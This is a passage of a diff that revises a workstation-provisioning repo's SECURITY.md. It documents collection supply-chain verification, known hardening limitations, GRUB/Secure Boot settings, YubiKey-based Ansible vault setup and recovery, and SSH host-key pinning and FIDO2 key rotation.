+  backslash-escaped structured extra-vars, and `-e` overrides of protected variables (`csb_rhel`, `_pf_*`, `system_sysctl_hardening`,
+  `common_project_root`, `rollout_enable`, `rollout_catalog`, `_rollout_*`)
+- canonicalizes abbreviated long options before scanning
+- turns shell tracing off and clears `BASH_XTRACEFD`, `PS4`, `SHELLOPTS`, `BASHOPTS` and 90+ other environment variables
+  (`ANSIBLE_*`, `LD_*`, `PYTHON*`, `GIT_*`, Go, container and registry variables), pins `ANSIBLE_VAULT_PASSWORD_FILE`, and checks `HOME`
+- runs `scripts/verify-collections.sh` before exec
+
+Each role also re-validates its critical inputs at the start of `main.yml` (for example, `roles/claude/tasks/main.yml` constrains
+`claude_install_url` to `claude.ai` or `anthropic.com`), so a skipped `pre_tasks` does not reach the installer.
+
+**Chunk selection** (`rollout_enable` in `config.yml`, registry `group_vars/all/rollout.yml`): a chunk's name is its Ansible tag. The
+wrapper
+turns every chunk that is not enabled into `--skip-tags` for `site.yml` runs and rejects an invalid `rollout_enable` before any sudo prompt.
+Play 0 (`pre-flight.yml`) has an `always`-tagged assert that every disabled chunk is in `ansible_skip_tags`, so a direct `ansible-playbook`
+run cannot apply a disabled chunk. The enabled list can only come from `config.yml`. Skipping a chunk's tag also skips `always` guards
+inside
+that chunk's tasks (they only protect that chunk); top-level guards stay.
 
 ## Ansible Collections Supply Chain
 
-### Owner Signatures and Upstream Hashes
+Four collections are vendored in `collections-dist/` (versions pinned in `requirements.yml`; archives listed in `SHA256SUMS`).
 
-The current placeholder is described above. Until a real owner key is configured, CI relies
-on the independent Galaxy hash check, local archive and manifest checks, signed supply-chain
-commits, and code review. These checks must not be described as upstream signature verification.
+### Ansible Collections Maintainer Identity Verification
 
-**Known Vulnerability**: Ansible Galaxy does not publish GPG signatures, Sigstore certificates,
-or SLSA provenance for community collections. If a collection maintainer's Galaxy account is
-compromised (phishing, credential theft, 2FA bypass), attacker can publish malicious code that
-defeats hash-based verification: the attacker controls both the CDN tarball and the Galaxy API
-`artifact.sha256` field simultaneously.
+Galaxy publishes no GPG signatures, Sigstore certificates or SLSA provenance for community collections. If a maintainer's Galaxy account is
+compromised, the attacker controls both the CDN tarball and the API `artifact.sha256` field, so hash verification passes. Until a real owner
+key is configured, protection is: version pinning, the independent Galaxy API cross-check (catches CDN corruption only), local archive and
+manifest checks, and review of every collection bump. These checks must not be described as upstream signature verification. Report a
+suspected compromise to the [Galaxy security team](https://galaxy.ansible.com/security).
 
-**Affected collections** (vendored in `collections-dist/`):
+### Verification layers
 
-- ansible.posix-2.2.2
-- community.general-13.5.0
-- community-library_inventory_filtering_v1-1.1.5
-- containers.podman-1.21.2
+1. **Pre-commit hook** blocks `collections-dist/*.tar.gz` changes without a `SHA256SUMS` update
+2. **`make bootstrap`** runs `sha256sum -c SHA256SUMS` and `scripts/verify-collections-galaxy.sh`
+3. **Runtime** `scripts/verify-collections.sh` re-verifies before every wrapped run (TOCTOU guard)
+4. **CI** `collections-integrity` runs the Galaxy and runtime checks; `collections-manifest` checks the Python manifest;
+   `galaxy-recheck` and `upstream-collections-check` (`scripts/verify-vendor-tarball.sh`) compare against Galaxy and upstream release tags
+5. **Audit trail** — tarballs are committed to git, not ignored
 
-**Attack scenario**:
-
-1. Attacker obtains Galaxy maintainer credentials (phishing, password reuse, session hijack)
-2. Attacker publishes malicious collection version (e.g., community.general-13.2.1) to Galaxy CDN
-3. Attacker updates Galaxy API `artifact.sha256` field to match the malicious tarball
-4. User runs `make vendor-collections` — downloads malicious tarball
-5. Hash verification passes because both CDN and API are attacker-controlled
-6. Malicious code is committed to `collections-dist/` and executed during `make all`
-
-**Mitigations Implemented** (defense-in-depth):
-
-1. **VERSION PINNING** — All collections pinned to specific versions in `requirements.yml`.
-   Prevents silent upstream updates. Requires deliberate version bump review.
-
-2. **MANDATORY CODE REVIEW** — Collection updates require human review BEFORE committing:
-   - Download new version via `make vendor-collections` (Galaxy API verification only catches
-     CDN corruption, not account compromise)
-   - Review upstream CHANGELOG for suspicious changes
-   - Compare old vs. new collection tasks/modules for behavioral changes (network calls, file
-     operations, privilege escalation)
-   - Create PR; require approval from designated reviewer (branch protection enforces this)
-   - Only merge after approval from human reviewer
-
-3. **CI INTEGRITY ENFORCEMENT**:
-   - Pre-commit hook: blocks `collections-dist/*.tar.gz` modifications without `SHA256SUMS` update
-   - CI `collections-integrity` job: validates `sha256sum -c SHA256SUMS` on every PR
-   - Bootstrap: verifies hashes before Ansible execution
-   - `verify-collections.sh`: re-verifies at runtime (TOCTOU tampering guard)
-
-4. **GALAXY API CROSS-VERIFICATION** — Each hash verified against Galaxy API `artifact.sha256`
-   field (different service path than CDN). Limitation: Both controlled by Galaxy infrastructure;
-   does NOT prevent maintainer account compromise attacks.
-
-5. **AUDIT TRAIL** — Collection tarballs committed to git (not gitignored), enabling post-incident
-   forensic analysis and creating public record of supply chain decisions.
-
-**Code Review Procedure** (when updating a collection version):
+### Upgrade procedure
 
 ```bash
-# 1. Download and verify via Galaxy API (basic consistency check)
+# 1. Bump the version in requirements.yml AND in the spec list inside the vendor-collections recipe in the Makefile, regenerate the
+#    Makefile baseline with `sha256sum Makefile > Makefile.sha256` (the pre-commit hook rejects a changed Makefile without it), then:
 make vendor-collections
 
-# 2. Review upstream CHANGELOG for suspicious changes
-tar -xzOf collections-dist/community-general-*.tar.gz CHANGELOG.rst | head -100
-# Look for: new tasks, plugins, external service calls, privilege escalation
+# 2. Review the upstream changelog for new tasks, plugins, network calls and privilege escalation
+tar -xzOf collections-dist/community-general-<new>.tar.gz CHANGELOG.rst | head -100
 
-# 2b. Compare vendored runtime files against the upstream GitHub release tag
-#     (CI runs the same check; needs network and git)
+# 3. Compare vendored runtime files against the upstream release tag (needs network and git; CI runs the same check)
 scripts/verify-vendor-tarball.sh
 
-# 3. Compare old vs. new version for behavioral differences
-mkdir /tmp/old /tmp/new
-tar -xzf collections-dist/community-general-OLD.tar.gz -C /tmp/old
-tar -xzf collections-dist/community-general-NEW.tar.gz -C /tmp/new
-diff -r /tmp/old/plugins /tmp/new/plugins | head -50
+# 4. Diff old and new plugins
+d=$(mktemp -d)
+mkdir "$d/old" "$d/new"
+tar -xzf collections-dist/community-general-<old>.tar.gz -C "$d/old"
+tar -xzf collections-dist/community-general-<new>.tar.gz -C "$d/new"
+diff -r "$d/old/plugins" "$d/new/plugins" | head -50
 
-# 4. Commit with signoff and clear message (audit trail)
-git add requirements.yml collections-dist/SHA256SUMS collections-dist/*.tar.gz
-git commit -s -m "Collections: upgrade community.general to 13.2.1
-
-Changelog reviewed: no suspicious changes detected. New tasks/modules
-compared against previous version — no behavioral changes."
-
-# 5. Create PR and request approval from security reviewer
-git push origin feature-branch
-# Wait for approval before merging
+# 5. Commit with signoff on a branch and open a PR; review the diff before merging
+git add requirements.yml Makefile Makefile.sha256 collections-dist
+git commit -s -m "Collections: bump community.general to <new>"
 ```
 
-**SHA256SUMS Signature Verification**:
-
-The bundled collection signature is a placeholder. Before enabling GPG enforcement,
-replace it with a real owner signature and verify it:
+When enforcement is enabled, re-sign `SHA256SUMS` and replace `SHA256SUMS.asc` in the same commit (the pre-commit hook rejects a
+stale signature), and verify the signature before trusting the checksums:
 
 ```bash
-# 1. Get the fingerprint from § Cryptographic Identities Registry (Collections Signing row)
-
-# 2. Import the public key (if not already in your keyring)
-gpg --keyserver keys.openpgp.org --recv-keys <fingerprint>
-
-# 3. Verify the fingerprint matches the registry value
-gpg --list-key <fingerprint> | grep fingerprint
-
-# 4. Verify the signature on SHA256SUMS
+gpg --keyserver keys.openpgp.org --recv-keys <fingerprint-from-registry>
+gpg --list-key <fingerprint-from-registry>
 gpg --verify collections-dist/SHA256SUMS.asc collections-dist/SHA256SUMS
 ```
 
-This verification step is required when GPG enforcement is enabled. See `collections-dist/SHA256SUMS`
-file header for complete verification procedure.
-
-**Future Mitigations** (when available):
-
-- When maintainers publish GPG-signed tarballs or SLSA provenance, add GitHub release URLs +
-  maintainer GPG key fingerprints to `collections-dist/SHA256SUMS` and integrate GPG verification
-  in `make bootstrap`.
-- SLSA provenance via Sigstore/Cosign (when upstream support arrives) — validate supply chain
-  attestation in CI `collections-integrity` job.
-- Automated signature verification in `make bootstrap` pre-flight checks (would require keyserver
-  configuration or bundled public keys).
-
-**Reporting Compromise**: If you suspect a collection maintainer's Galaxy account has been
-compromised, report immediately to Galaxy security team: <https://galaxy.ansible.com/security>
-
-See also: `CLAUDE.md` § "CI Security" for vendored collections context and `SECURITY.md` § "Ansible Collections Supply Chain" for the
-upgrade procedure and mandatory review checklist.
-
 ## Known Limitations
 
-- **Bluetooth enabled (CIS RHEL 9 2.1.5)** — CIS 2.1.5 recommends disabling
-  Bluetooth by blacklisting the `btusb`/`bluetooth` kernel modules.
-  `system_disable_bluetooth` defaults to `true` (Bluetooth disabled); this
-  ThinkPad P16v Gen 1 AMD sets it to `false` in `config.yml` for its Bluetooth mouse.
-  Keep `system_disable_bluetooth: true` on machines that
-  have no Bluetooth peripherals.
-- **ptrace_scope (CIS 1.6.3)** — `system_ptrace_scope` defaults to 1 (parent-only, CIS
-  Level 1). Fedora's own default is 0, which lets a user attach to any of their own
-  processes (`gdb -p`, `dlv attach`); set `system_ptrace_scope: 0` in `config.yml` on
-  developer machines that need that.
-- **claude.ai install.sh** — the installer script is downloaded with get_url and run only
-  when it matches `claude_install_sha256` (with `claude_pinned_version` as a minimum
-  version); the binaries it fetches come from Anthropic's rolling release channel and are
-  not pinned by this repo
-- **SHA256-only verification for tkn, ec, and operator-sdk** — Three work-profile
-  binaries (tkn, ec, operator-sdk) use SHA256 checksum verification without cryptographic
-  signatures or Sigstore attestations. **tkn** (Tekton CLI): tektoncd/cli releases publish
-  only plain `checksums.txt` with no cosign bundles or GPG signatures. **ec** (Enterprise
-  Contract CLI): conforma/cli releases publish only plain `.sha256` files with no Sigstore
-  attestations. **operator-sdk**: operator-framework/operator-sdk releases publish GPG-signed
-  `checksums.txt.asc` but the playbook does not yet verify GPG signatures (no public key
-  pinning). In contrast, properly verified binaries (cosign, actionlint, zizmor) use
-  full cosign bundle verification or GitHub attestation via `gh CLI`; sops is SHA256-pinned only. SHA256-only verification
-  defends against CDN corruption but NOT against a compromised GitHub releases CDN or
-  maintainer account (attacker can upload matching binary + updated SHA256 pair). Mitigation:
-  inspect upstream releases manually in high-security environments before updating SHA256
-  values in `roles/packages/defaults/main.yml`. See `roles/packages/tasks/install_standalone_binaries.yml`
-  TODO comments at lines 748 (tkn) and 785 (ec) for upstream tracking.
-- **Secure Boot + GRUB bootloader password (CIS 1.4.2)** — Kernel `lockdown=integrity`
-  without Secure Boot is weakened by an unprotected GRUB bootloader. Ansible now enforces GRUB
-  superuser password protection (opt-in via `system_grub_password_enabled` in config.yml) to prevent
-  physical console attacks that disable lockdown before it activates at boot. **Both** Secure
-  Boot (BIOS setting — out of scope for Ansible) AND GRUB password are required for full protection.
-  On non-Secure Boot systems, the GRUB password guards a pre-reboot vulnerability window. Set
-`system_grub_password_enabled: true` in config.yml and `vault_grub_password_hash` in
-  vault.yml (never `system_grub_password_hash` in config.yml).
-  Empty (default) disables GRUB password; RHEL CSB skips (IT manages bootloader).
-  **UEFI firmware password scope**: GRUB password protects only the GRUB menu — it does NOT
-  prevent a physical attacker from entering firmware setup to change the UEFI boot order (e.g.,
-  boot from USB) or disable Secure Boot entirely. A UEFI/BIOS admin password must be set in
-  firmware setup (vendor-specific; not configurable via Ansible) to close this gap. Without a
-  UEFI admin password, GRUB password provides only GRUB-menu-level protection. The provisioning
-  playbook emits an advisory warning when `system_grub_password_enabled: true` and fwupdmgr
-  cannot confirm a UEFI admin password (`get-bios-setting` output checked for AdminPassword /
-  BiosPassword / SetupPassword fields). Verify via your vendor's firmware setup utility.
-- **lockdown=integrity does NOT enforce userspace binary integrity** — `lockdown=integrity`
-  restricts kernel self-modification (hibernation, kprobes, /dev/mem writes, unsigned modules,
-  kexec of unverified kernels) but has **no effect on userspace binary execution**. It does not
-  verify executable hashes or signatures before `execve()`. Fedora's default IMA mode is
-  `measure-only` (audit log only, no enforcement); no IMA appraisal policy is deployed by this
-  playbook (`ima_appraise=enforce` is not set, no `/etc/ima/ima-policy` is written). An attacker
-  with write access to any executable path (e.g., a writable `/usr/local/bin` via a compromised
-  container, a rogue dnf plugin, or a build-tool path injection) can silently replace a binary;
-  on next `execve()` the kernel executes the replaced file without any hash or signature check.
-  **lockdown and IMA are orthogonal subsystems with no dependency relationship.** Do not rely on
-  `lockdown=integrity` for userspace binary integrity enforcement. Mitigations available but not
-  enabled by default: SELinux (blocks unexpected writes to labelled executables — active and
-  enforcing by default on Fedora/RHEL), AIDE file-integrity monitoring (`system_aide_enabled:
-  true`), and optional full IMA appraisal (deploy `/etc/ima/ima-policy` + `ima-evm-utils` +
-  `ima_appraise=enforce` kernel cmdline — not provided by this playbook; requires signed
-  executables across the whole userspace, which Fedora does not ship by default).
-- **Swap and vault memory remanence** — During provisioning, Ansible loads and decrypts
-  `group_vars/all/vault.yml` into Python heap memory. On hosts with active swap (default Fedora
-  uses zram; default RHEL allocates a swap partition), memory pressure can cause the kernel to
-  page these decrypted vault contents — SSH private keys, registry tokens, GRUB password hashes —
-  to the swap device. These pages persist in swap after the provisioning process exits and survive
-  a reboot unless the swap device is cryptographically wiped. Any process with block-device read
-  access (root, or a container escape from a privileged container) can recover these pages offline.
-  **Mitigations applied by this playbook**:
-  (1) `vm.swappiness: 1` in `system_sysctl_hardening` strongly minimizes swapping while preserving
-  swap as an OOM-killer last resort on memory-constrained hosts. Override to `vm.swappiness: 0` in
-  `config.yml` via `system_sysctl_extra_additional` if the host has full-disk encryption (LUKS) and
-  you want to eliminate swap entirely.
-  (2) Use full-disk encryption (LUKS/dm-crypt) on the swap partition or swap file so that any
-  pages written to swap are cryptographically protected at rest. Fedora Anaconda can configure
-  LUKS for the swap partition during install.
-  (3) Minimize the provisioning window: run `make all` on a local console (not over SSH), avoid
-  long-running interactive sessions after provisioning, and reboot promptly after `make all`
-  completes to flush swap.
-  **Note**: zram swap (Fedora default) compresses pages in RAM — data never leaves RAM — so
-  zram does not expose vault pages to block-device attacks. RHEL swap partitions do not use zram
-  by default; ensure LUKS encryption is active on RHEL hosts before provisioning with real secrets.
-- **LUKS TRIM/discard** — managed via Ansible `system_luks_discards_enabled: false` (default).
-  Discard is disabled by default to mitigate SSD wear-pattern fingerprinting attacks that can
-  correlate TRIM patterns with plaintext block locations. Set `system_luks_discards_enabled: true`
-  in `config.yml` ONLY on machines where SSD longevity outweighs cryptographic remanence protection
-  (e.g., temporary test environments with disposable data). Non-default setting requires explicit
-  opt-in to ensure awareness of the security tradeoff. Smoke-test warns when discard is active.
-- **Vault password: HMAC-SHA1 has 80-bit post-quantum security** — The vault password is derived
-  from YubiKey HMAC-SHA1 (hardware-limited; HMAC-SHA256 unavailable in firmware). While vault
-  encryption (AES-256-CTR) is quantum-safe with 128-bit effective PQ security, the password itself
-  has only 80-bit effective post-quantum security (Grover's algorithm halvings). This is currently
-  acceptable (quantum computers in 2025 have ~2,000 noisy qubits, insufficient for Grover attacks).
-  **Migration path:** Documented in SECURITY.md § "Quantum Security Posture" — migrate to SOPS +
-  age-plugin-yubikey (P-384, 96-bit PQ security) when hardware PQ support arrives (~2027).
-  See § "Future Migration to SOPS + age" for setup instructions.
-- **Vault + CI** — encrypting vault.yml with a real YubiKey-derived password
-  will break CI syntax-check (which uses the dummy password stub); this is
-  a known design tradeoff, not a bug
+- **Bluetooth** — `system_disable_bluetooth` defaults to `true` (CIS 2.1.5, blacklists `btusb`/`bluetooth`). Set it to `false` if you rely
+  on Bluetooth peripherals.
+- **ptrace_scope (CIS 1.6.3)** — `system_ptrace_scope` defaults to 1 (parent-only). Set 0 in `config.yml` on developer machines that need
+  `gdb -p` or `dlv attach`.
+- **claude.ai install.sh** — downloaded with `get_url` and run only when it matches `claude_install_sha256` (`claude_pinned_version` is a
+  minimum version); the binaries it fetches come from Anthropic's rolling release channel and are not pinned by this repo.
+- **SHA256-only release binaries** — tkn, ec, operator-sdk, sops, actionlint and zizmor use pinned SHA256 checksums without signature or
+  attestation checks (tkn and ec upstreams publish no Sigstore attestations; see the TODOs in
+  `roles/packages/tasks/install_standalone_binaries.yml`). This defends against CDN corruption but not a compromised release or maintainer
+  account. Review upstream releases before updating hashes in `roles/packages/defaults/main.yml`. cosign upgrades verify the Sigstore
+  bundle.
+- **lockdown=integrity is not userspace integrity** — it restricts kernel self-modification (unsigned modules, `/dev/mem` writes, kexec of
+  unverified kernels) and does nothing about executed binaries. No IMA appraisal policy is deployed (Fedora's default is measure-only).
+  Mitigations: SELinux enforcing, optional AIDE (`system_aide_enabled: true`), or a full IMA appraisal setup this playbook does not provide.
+- **Swap and vault memory remanence** — Ansible decrypts the vault into process memory; under memory pressure the pages can be swapped to a
+  block device and survive a reboot. `vm.swappiness: 1` minimizes swapping (override to 0 via `system_sysctl_extra_additional` on LUKS
+  hosts); zram-only hosts keep pages in RAM and use `system_zram_swappiness`. Use LUKS on swap partitions, run `make all` on a local console
+  and reboot promptly afterwards.
+- **LUKS TRIM/discard** — `system_luks_discards_enabled: false` (default) avoids SSD wear-pattern leakage. Enable only where SSD longevity
+  outweighs that risk; smoke-test warns when discard is active.
+- **Vault password strength** — the vault password is the 160-bit YubiKey HMAC-SHA1 output, about 80-bit strength against Grover-style
+  attacks (YubiKey firmware has no HMAC-SHA256). Accepted risk; revisit when hardware supports a stronger primitive.
+- **Vault and CI** — CI copies `scripts/vault-pass-ci.sh` over `vault-pass.sh`; the committed `vault.yml` is a plaintext stub.
+  Committing a vault encrypted with the real password breaks CI jobs that decrypt with the dummy password, and CI rejects a vault
+  encrypted with the dummy password.
+
+## Secure Boot + GRUB bootloader password
+
+`lockdown=integrity` without Secure Boot is weakened by an unprotected GRUB: a physical attacker can edit the kernel command line before
+lockdown activates. Both protections are needed.
+
+- Secure Boot is a firmware setting (out of scope for Ansible); `make smoke-test` reports its state.
+- The GRUB superuser password is opt-in: set `system_grub_password_enabled: true` in `config.yml` and `vault_grub_password_hash` in the
+  vault (generate with `grub2-mkpasswd-pbkdf2`; never put the hash in `config.yml`). Leaving the hash empty while
+  `system_grub_password_enabled` is true fails provisioning at the hash assert (it does not disable the GRUB password). The default,
+  `system_grub_password_enabled: false`, sets no password. RHEL CSB skips it (IT manages the bootloader).
+- A GRUB password does not stop a physical attacker from entering firmware setup to change boot order or disable Secure Boot. Set a
+  UEFI/BIOS admin password in firmware (not configurable via Ansible). The playbook warns when it cannot confirm one via
+  `fwupdmgr get-bios-setting`.
 
 ## Vault Security
 
-- Vault ships as a plaintext stub (`vault_placeholder`) — encrypt after
-  adding real secrets
-- Production vault password should be derived from YubiKey HMAC-SHA1
-  challenge-response
-- `vault-pass.sh` is gitignored; `make bootstrap` creates a stub for
-  development
-- CI uses `vault-pass-ci.sh` with a dummy password (no real secrets)
-- Pre-commit hook blocks committing unencrypted vault files containing
-  real variables
-- Rotate vault password: re-key with
-  `ansible-vault rekey group_vars/all/vault.yml`
+- Vault ships as a plaintext stub (`vault_placeholder`); encrypt after adding real secrets
+- The production vault password is derived from YubiKey HMAC-SHA1 challenge-response
+- `vault-pass.sh` is gitignored; `make bootstrap` creates a stub from `vault-pass-ci.sh` (integrity-checked)
+- CI uses `vault-pass-ci.sh` with a dummy password (no real secrets); a CI job rejects vaults encrypted with it
+- The pre-commit hook blocks committing unencrypted vault files that contain real variables
+- Rotate the password with `ansible-vault rekey group_vars/all/vault.yml`
 
 ### Setting Up vault-pass.sh
 
-**Use the script** — programs all YubiKeys in one run, verifies each produces
-identical output, and writes `vault-pass.sh` automatically:
+Use the script. It programs all YubiKeys in one run, verifies each produces identical output, and writes `vault-pass.sh` atomically:
 
 ```bash
 make setup-yubikeys
 ```
 
-The script (`scripts/setup-yubikeys.sh`) generates a fresh HMAC secret, programs
-each YubiKey slot 2, verifies outputs match, and writes `vault-pass.sh`. The HMAC
-secret never touches disk — keep all YubiKeys in separate physical locations.
+`scripts/setup-yubikeys.sh` generates a fresh HMAC secret, programs slot 2 of each key, and verifies the outputs match. The secret never
+touches disk and is never displayed. Keep the YubiKeys in separate physical locations.
 
-**If you need to write vault-pass.sh manually**:
+To write `vault-pass.sh` manually:
 
 ```bash
 #!/bin/bash
@@ -730,7 +341,7 @@ _to=timeout; command -v timeout >/dev/null 2>&1 || _to=gtimeout
 }
 ```
 
-After writing vault-pass.sh, encrypt the vault:
+Then:
 
 ```bash
 chmod 700 scripts/vault-pass.sh
@@ -738,39 +349,29 @@ chmod 700 scripts/vault-pass.sh
 ansible-vault encrypt group_vars/all/vault.yml
 ```
 
+### Future Migration to SOPS + age
+
+HMAC-SHA1 is the only challenge-response primitive the YubiKey OTP applet offers. If stronger hardware support arrives, migrate secrets to
+SOPS with `age-plugin-yubikey` and retire `vault-pass.sh`. No migration is scheduled; see "Known Limitations" for the strength trade-off.
+
 ### Lost or Compromised YubiKey
 
-**Backup strategies** — `make setup-yubikeys` enforces one of the following:
+`make setup-yubikeys` enforces a recovery path:
 
-1. **Hardware redundancy (recommended)** — Program 2+ YubiKeys in one session with
-   the same HMAC secret before storing backups in separate physical locations.
-   If one key is lost, any other programmed key can unlock the vault.
+1. **Hardware redundancy (recommended)** — program 2+ YubiKeys in one session with the same secret and store them separately; any one
+   unlocks the vault.
+2. **Password manager backup (single YubiKey)** — the script requires you to save the vault password to your password manager during setup.
 
-2. **Password manager backup (for single YubiKey)** — If using a single YubiKey,
-   `make setup-yubikeys` requires you to save the vault password to your password
-   manager (Bitwarden, 1Password, etc.) during setup. This provides recovery if
-   the YubiKey is lost. The setup script displays the password clearly and confirms
-   you have saved it before proceeding.
+The HMAC secret cannot be read back from a YubiKey and the script never displays it, so a replacement key cannot be cloned afterwards.
+To rotate to new keys, decrypt with a surviving key (or the saved password), re-run `make setup-yubikeys` (which generates a new secret and
+so
+changes the vault password), then re-encrypt the decrypted vault with `ansible-vault encrypt group_vars/all/vault.yml`. (`rekey` needs an
+encrypted file and fails on plaintext.)
 
-**Manual re-programming** — if you have the original 40-character hex key from
-a previous run, program a replacement YubiKey:
+**Recovering with the saved password:**
 
-```bash
-ykpersonalize -2 -ochal-resp -ochal-hmac -ohmac-lt64 -oserial-api-visible \
-  -a <original-40-char-hex-key>
-```
-
-Without `-a <hexkey>`, `ykpersonalize` generates a new random secret and the
-backup will not produce the same vault password. The HMAC secret cannot be read
-back from a YubiKey after programming, so retroactive backup is impossible.
-
-**Recovering from lost YubiKey with password backup** — If you saved the vault
-password to your password manager during setup:
-
-1. Retrieve the vault password from your password manager
-2. Set the environment variable without recording it in shell history
-   (`read -rs VAULT_PASS && export VAULT_PASS`)
-3. Create a temporary password script:
+1. Retrieve the password and read it into the shell without recording it in history: `read -rs VAULT_PASS && export VAULT_PASS`
+2. Create a temporary password script:
 
    ```bash
    umask 077
@@ -779,431 +380,105 @@ password to your password manager during setup:
    chmod 700 "$tmp/vault-pass-temp.sh"
    ```
 
-4. Use it to decrypt/rekey the vault:
+3. Call `ansible-vault` directly. Do not use `make vault-*`, because the wrapper pins `scripts/vault-pass.sh`:
 
    ```bash
-   export ANSIBLE_VAULT_PASSWORD_FILE="$tmp/vault-pass-temp.sh"
-   make vault-view
-   # or to migrate to a new password source:
-   ansible-vault rekey group_vars/all/vault.yml
+   ansible-vault view --vault-password-file "$tmp/vault-pass-temp.sh" group_vars/all/vault.yml
+   ansible-vault rekey --vault-password-file "$tmp/vault-pass-temp.sh" group_vars/all/vault.yml
    ```
 
-**YubiKey lost with no backup** — if you programmed a single YubiKey without
-saving the password to a password manager, the vault is permanently inaccessible.
-The only recovery path is to re-encrypt from scratch: recover the secret values
-from memory or other records, edit `group_vars/all/vault.yml` with known secrets,
-then re-key with a new password source:
+4. Shred the temporary script and unset the variable: `shred -u "$tmp/vault-pass-temp.sh"; rmdir "$tmp"; unset VAULT_PASS`
 
-```bash
-ansible-vault rekey group_vars/all/vault.yml
-```
-
-## GPG Key Requirements for Supply-Chain Commits
-
-When `.gpg-enforcement` is enabled, commits modifying scripts, SHA256SUMS,
-collections, or .githooks require cryptographic signatures. It is currently disabled;
-Signed-off-by remains required.
-
-### Key algorithm requirements
-
-- RSA 4096-bit or stronger (or ed25519)
-- Private key must be available locally (`gpg --list-secret-keys` to verify)
-
-### Git configuration (one-time setup)
-
-```bash
-git config --global commit.gpgsign true  # Always sign commits
-git config --global user.signingkey KEYID  # Set your key ID
-```
-
-**Enforcement**: The commit-msg and pre-push hooks and CI job `gpg-signatures`
-follow `.gpg-enforcement`. With enforcement enabled, supply-chain changes require
-both `-s` (signoff text) and `-S` (cryptographic signature). With enforcement disabled,
-signoff and the other integrity gates continue running.
-
-**Setup**: For detailed GPG key generation, importing, and verification procedures, see external resources:
-
-- [GnuPG Handbook](https://www.gnupg.org/documentation/manuals/gnupg/) (official)
-- [GitHub GPG Key Setup](https://docs.github.com/en/authentication/managing-commit-signature-verification) (GitHub-specific)
-- [EFF Security Guide](https://ssd.eff.org/en) (beginner-friendly)
-
-Cross-reference this requirement with § "Git Hook Security and Signing" for the distinction between `-s` and `-S` flags and enforcement
-mechanisms.
+**No YubiKey and no saved password** — the vault is permanently inaccessible. Re-create the secrets, replace `group_vars/all/vault.yml`
+with a fresh plaintext template, then run `make setup-yubikeys` and `ansible-vault encrypt group_vars/all/vault.yml`.
 
 ## Internal SSH Git Host Setup
 
-When cloning repositories from internal SSH git servers (not GitHub), pre-seed SSH host keys
-with optional fingerprint pinning to prevent MITM attacks at first connection. Configure
-`ssh_work_keyscan_hosts` in `config.yml` (work profile only):
+For repositories on internal SSH git servers (not GitHub), pre-seed host keys with optional fingerprint pinning to prevent MITM at first
+connection. Configure `ssh_work_keyscan_hosts` in `config.yml` (work profile only):
 
 ```yaml
 ssh_work_keyscan_hosts:
   - {host: internal-git.example.com, fingerprint: "SHA256:..."}
-  - {host: gitlab.internal, fingerprint: "SHA256:..."}
 ```
 
-### Obtaining fingerprints
+1. Request each server's SSH host key fingerprint from its administrators over a secure out-of-band channel (phone, in person, verified
+   email)
+2. Confirm it: `ssh-keyscan -t ed25519 internal-git.example.com | ssh-keygen -lf /dev/stdin`
+3. Add it as the `fingerprint` field. Omitting `fingerprint` means trust on first use (less secure). A placeholder that is not a full
+   `SHA256:` value defers the host: nothing is seeded and its SSH repos are skipped until you set the real value
 
-1. Contact internal IT via a secure out-of-band channel (phone, in-person, verified email)
-   and request the SSH host key fingerprint for each internal git server.
-2. Verify the fingerprint matches:
-
-   ```bash
-   ssh-keyscan -t ed25519 internal-git.example.com | ssh-keygen -lf /dev/stdin
-   ```
-
-3. Add to `config.yml` with the `fingerprint: "SHA256:..."` field.
-
-**TOFU (Trust On First Use) mode** — omit the `fingerprint` field to accept the key without
-pinning. This is less secure but acceptable if out-of-band fingerprint verification is
-unavailable.
-
-### Technical details
-
-- `ssh_work_keyscan_hosts` triggers `roles/ssh/tasks/keyscan_host.yml` during provisioning,
-  which pre-seeds `~/.ssh/known_hosts` with SSH host keys for internal git servers.
-- The `git_repos` role automatically pre-seeds host keys for SSH-based repo URLs
-  (git@host:repo.git) before cloning, ensuring `known_hosts` is populated before the git
-  client attempts connection.
-- GitHub SSH keys are automatically pre-seeded via the GitHub API (no manual configuration needed).
+`roles/ssh/tasks/keyscan_host.yml` seeds `~/.ssh/known_hosts` (work profile only). The `git_repos` role does not seed hosts: it clones SSH
+repos only from hosts already in `known_hosts` and defers the rest to `make ssh repos`. GitHub keys are seeded from a pinned key.
 
 ## SSH Key Rotation
 
-1. Generate a new auth key pair:
-
-   ```bash
-   ssh-keygen -t ed25519-sk -f ~/.ssh/id_ed25519_sk
-   ```
-
-2. Generate a new signing key pair:
-
-   ```bash
-   ssh-keygen -t ed25519-sk -f ~/.ssh/id_ed25519_sk_signing
-   ```
-
-3. Run `make vault-edit` to update all four vault variables:
-   `vault_ssh_auth_key`, `vault_ssh_auth_key_pub`,
-   `vault_ssh_signing_key`, `vault_ssh_signing_key_pub`
-4. Run `make ssh` to deploy the new keys on this machine and update
-   `authorized_keys` (the role uses `exclusive: true`, so the old key
-   is automatically removed from this machine's `authorized_keys`).
-5. Remove the old public key from `authorized_keys` on every other
-   machine that previously trusted it.
-
-## FIDO2 SSH Key Best Practices
-
-Always generate `ed25519-sk` keys with `-O verify-required`:
+Generate `ed25519-sk` keys with `-O verify-required`, and set a FIDO2 PIN first so a stolen key cannot be used by touch alone:
 
 ```bash
-# Set FIDO2 PIN first (prevents silent use if key is stolen):
 ykman fido access change-pin
-
-# Generate auth key — verify-required = PIN + touch on every use:
 ssh-keygen -t ed25519-sk -O verify-required -f ~/.ssh/id_ed25519_sk
-# Or as a resident/discoverable credential:
-ssh-keygen -t ed25519-sk -O resident -O verify-required -f ~/.ssh/id_ed25519_sk
-
-# Same for signing key:
 ssh-keygen -t ed25519-sk -O verify-required -f ~/.ssh/id_ed25519_sk_signing
+# Or add -O resident to store a discoverable credential on the key
 ```
 
-`-O verify-required` (user-verification flag) gates every SSH operation on
-PIN + touch. Without it, physical touch alone is sufficient — a stolen,
-unpinned YubiKey silently authenticates. A FIDO2 PIN with at least 8
-characters provides the second factor; `ykman fido info` shows current PIN
-state.
+Then:
 
-**SSH key rotation** should also add `-O verify-required` to both keygen
-commands in the SSH Key Rotation section above.
+1. Run `make vault-edit` and update `vault_ssh_auth_key`, `vault_ssh_auth_key_pub`, `vault_ssh_signing_key`, `vault_ssh_signing_key_pub`
+2. Run `make ssh` to deploy the keys; `authorized_keys` is written with `exclusive: true`, so the old key is removed from this machine
+3. Remove the old public key from `authorized_keys` on every other machine that trusted it
 
-## Quantum Security Posture
-
-| Component | Algorithm | Quantum status | Effective security |
